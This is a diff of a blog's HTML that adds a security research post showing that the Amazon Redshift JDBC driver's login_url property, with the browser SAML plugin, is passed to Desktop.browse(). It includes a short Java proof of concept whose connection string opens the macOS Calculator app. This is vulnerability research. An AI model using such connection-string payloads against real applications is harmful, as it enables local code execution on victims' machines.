@@ -6,15 +6,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://pynerd.cn">
-  <title>Archives: 2022 | </title>
+  <title>Amazon Redshift JDBC Driver Trick | </title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title">
-<meta property="og:url" content="http://pynerd.cn/archives/2022/page/2/">
+  <meta name="description" content="Amazon Redshift JDBC Driver supports plenty of properties as well.  https:&#x2F;&#x2F;docs.aws.amazon.com&#x2F;redshift&#x2F;latest&#x2F;mgmt&#x2F;jdbc20-configuration-options.html  However, there are two special properties plugin">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Amazon Redshift JDBC Driver Trick">
+<meta property="og:url" content="http://pynerd.cn/2022/06/29/Amazon-Redshift-JDBC-Driver-Trick/">
 <meta property="og:site_name">
+<meta property="og:description" content="Amazon Redshift JDBC Driver supports plenty of properties as well.  https:&#x2F;&#x2F;docs.aws.amazon.com&#x2F;redshift&#x2F;latest&#x2F;mgmt&#x2F;jdbc20-configuration-options.html  However, there are two special properties plugin">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://pynerd.cn/images/pasted-223.png">
+<meta property="og:image" content="http://pynerd.cn/images/pasted-224.png">
+<meta property="og:image" content="http://pynerd.cn/images/pasted-225.png">
+<meta property="og:image" content="http://pynerd.cn/images/pasted-226.png">
+<meta property="article:published_time" content="2022-06-29T14:24:15.000Z">
+<meta property="article:modified_time" content="2022-06-29T14:56:27.586Z">
 <meta property="article:author" content="pyn3rd">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://pynerd.cn/images/pasted-223.png">
   
     <link rel="alternative" href="/atom.xml" title="" type="application/atom+xml">
   
@@ -132,52 +141,131 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-Amazon-Redshift-JDBC-Driver-Trick" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2022" class="archive-year">2022</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/06/18/Weblogic-SSRF-Involving-Deserialized-JDBC-Connection/" class="archive-article-date">
-  	<time datetime="2022-06-18T05:55:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-06-18</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/06/18/Weblogic-SSRF-Involving-Deserialized-JDBC-Connection/">Weblogic SSRF Involving Deserialized JDBC Connection</a>
+    <h1 class="article-title" itemprop="name">
+      Amazon Redshift JDBC Driver Trick
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
+        
+        <a href="/2022/06/29/Amazon-Redshift-JDBC-Driver-Trick/" class="archive-article-date">
+  	<time datetime="2022-06-29T14:24:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-06-29</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Amazon Redshift JDBC Driver supports plenty of properties as well.</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://docs.aws.amazon.com/redshift/latest/mgmt/jdbc20-configuration-options.html">https://docs.aws.amazon.com/redshift/latest/mgmt/jdbc20-configuration-options.html</a></li>
+</ul>
+<p>However, there are two special properties <code>plugin_name</code> and <code>login_url</code>. The <code>plugin_name</code> is used for providing IAM credentials. The Amazon Redshift JDBC driver includes SAML-based credential provider plugins. One of the plugins is for SAML MFA , the plugin class named <code>com.amazon.redshift.plugin.BrowserSamlCredentialsProvider </code></p>
+<p>image-20220629215233929.png<br><img src="/images/pasted-223.png" alt="upload successful"></p>
+<p>So set the breakpoint at the method <code>openBrowser() </code> of  <code>BrowserSamlCredentialsProvider</code> class</p>
+<p>image-20220629214829137.png<br><img src="/images/pasted-224.png" alt="upload successful"></p>
+<p>Apparently , the value of the property <code>login_url</code> steps into the method <code>Desktop.getDesktop().browse()</code></p>
+<p>As we know, the method <code>Desktop.getDesktop().browse()</code> of the package <code>java.awt</code> will launch the default browser to display URI. Here is the sample for explanation</p>
+<p>image-20220629220156524.png<br><img src="/images/pasted-225.png" alt="upload successful"></p>
+<p>Consequently, just set <code>file:///System/Applications/Calculator.app</code> as the value of property <code>login_url</code>, the default browser will display it. Here is the PoC</p>
+<pre><code>import java.sql.DriverManager;
+import java.sql.SQLException;
 
+public class RedshiftDemo &#123;
+    public static void main(String[] args) throws SQLException &#123;
+
+        System.out.println(&quot;Amazon Redshift Driver Version: &quot; + com.amazon.redshift.jdbc42.Driver.class.getPackage().getSpecificationVersion());
+
+        DriverManager.registerDriver(new com.amazon.redshift.jdbc42.Driver());
+
+        DriverManager.getConnection(&quot;jdbc:redshift:iam://mycluster:us-west-2/dev?plugin_name=com.amazon.redshift.plugin.BrowserSamlCredentialsProvider&amp;login_url=file:///System/Applications/Calculator.app&quot;);
+    &#125;
+&#125;
+</code></pre>
+<p>image-20220629220815868.png<br><img src="/images/pasted-226.png" alt="upload successful"></p>
+<p>Make JDBC Attacks Brilliant Again!</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>thanks<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/2022/06/18/Weblogic-SSRF-Involving-Deserialized-JDBC-Connection/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Weblogic SSRF Involving Deserialized JDBC Connection</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/archives/2022/">&amp;laquo; Prev</a><a class="page-number" href="/archives/2022/">1</a><span class="page-number current">2</span><a class="page-number" href="/archives/2022/page/3/">3</a><a class="page-number" href="/archives/2022/page/4/">4</a><a class="page-number" href="/archives/2022/page/5/">5</a><a class="extend next" rel="next" href="/archives/2022/page/3/">Next &amp;raquo;</a>
-    </nav>
+  
+
+  
+
   
 
 
@@ -201,8 +289,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
